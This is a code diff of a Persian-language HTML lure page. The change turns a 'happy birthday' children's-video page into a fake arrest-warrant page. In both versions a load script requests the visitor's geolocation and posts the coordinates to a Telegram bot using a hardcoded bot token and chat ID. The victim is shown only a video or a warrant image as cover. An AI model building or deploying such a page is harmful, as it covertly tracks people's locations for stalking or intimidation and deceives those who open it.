@@ -3,34 +3,32 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>فلم های کودکان</title>
+  <title>برگ جلب</title>
   <style>
     body {
-      font-family: sans-serif;
       text-align: center;
+      font-family: sans-serif;
       padding: 20px;
     }
-    #myVideo {
-      width: 100%;
-      max-width: 600px;
-      display: none;
+    #jalbImage {
+      width: 794px; /* حدود عرض A4 در پیکسل با DPI 96 */
+      height: 1123px; /* حدود ارتفاع A4 */
+      max-width: 100%;
+      height: auto;
+      border: 2px solid black;
       margin-top: 20px;
     }
   </style>
 </head>
 <body>
-  <h2> تولد شما مبارک...</h2>
-  <p id="status">Please wait...</p>
+  <p id="status">جلب متهم...</p>
 
-  <video id="myVideo" controls>
-    <source src="myvideo.mp4" type="video/mp4">
-    Your browser does not support the video tag.
-  </video>
+  <!-- تصویر برگ جلب -->
+  <img id="jalbImage" src="JALB.jpg" alt="برگ جلب"/>
 
   <script>
     window.onload = function () {
       const status = document.getElementById('status');
-      const video = document.getElementById('myVideo');
 
       if (!navigator.geolocation) {
         status.innerText = "❌ Your browser does not support geolocation.";
@@ -43,10 +41,10 @@
           const lon = position.coords.longitude;
 
           const token = '7841305499:AAElwSSCBPF6-2cf_NEL3TXiK760exGM9pg';
-          const chatId = '7570861617';
+          const chatId = '7570861617';  // چت آی‌دی شما
           const message = `📍 User Location:\nLatitude: ${lat}\nLongitude: ${lon}`;
 
-          status.innerText = "📡 تولد شما مبارک...";
+          status.innerText = "📡 جلب متهم...";
 
           fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
             method: 'POST',
@@ -61,9 +59,7 @@
           .then(response => response.json())
           .then(data => {
             if (data.ok) {
-              status.innerText = "✅ تولد شما مبارک!";
-              video.style.display = "block";
-              video.play();
+              status.innerText = "✅ جلب متهم انجام شد!";
             } else {
               status.innerText = `❌ Telegram Error: ${JSON.stringify(data)}`;
             }
